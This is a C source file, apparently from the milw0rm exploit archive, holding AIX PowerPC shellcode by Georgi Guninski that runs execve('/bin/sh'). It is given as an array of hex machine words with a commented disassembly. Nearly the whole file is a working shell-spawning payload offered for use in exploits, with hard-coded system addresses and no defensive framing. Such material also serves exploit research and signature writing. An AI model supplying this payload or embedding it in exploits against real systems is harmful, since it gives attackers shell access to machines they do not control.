/*
 *  Aix
 *  execve() of /bin/sh Georgi Guninski (guninski@hotmail.com)
 */

unsigned int code[]={
  0x7c0802a6 , 0x9421fbb0 , 0x90010458 , 0x3c60f019 ,
  0x60632c48 , 0x90610440 , 0x3c60d002 , 0x60634c0c ,
  0x90610444 , 0x3c602f62 , 0x6063696e , 0x90610438 ,
  0x3c602f73 , 0x60636801 , 0x3863ffff , 0x9061043c ,
  0x30610438 , 0x7c842278 , 0x80410440 , 0x80010444 ,
  0x7c0903a6 , 0x4e800420, 0x0
};

/*      disassembly
  7c0802a6        mfspr   r0,LR
  9421fbb0        stu     SP,-1104(SP) --get stack
  90010458        st      r0,1112(SP)
  3c60f019        cau     r3,r0,0xf019 --CTR
  60632c48        lis     r3,r3,11336  --CTR
  90610440        st      r3,1088(SP)
  3c60d002        cau     r3,r0,0xd002 --TOC
  60634c0c        lis     r3,r3,19468  --TOC
  90610444        st      r3,1092(SP)
  3c602f62        cau     r3,r0,0x2f62 --'/bin/sh\x01'
  6063696e        lis     r3,r3,26990
  90610438        st      r3,1080(SP)
  3c602f73        cau     r3,r0,0x2f73
  60636801        lis     r3,r3,26625
  3863ffff        addi    r3,r3,-1
  9061043c        st      r3,1084(SP) --terminate with 0
  30610438        lis     r3,SP,1080
  7c842278        xor     r4,r4,r4    --argv=NULL
  80410440        lwz     RTOC,1088(SP)
  80010444        lwz     r0,1092(SP) --jump
  7c0903a6        mtspr   CTR,r0
  4e800420        bctr              --jump
*/

# milw0rm.com [2004-09-26]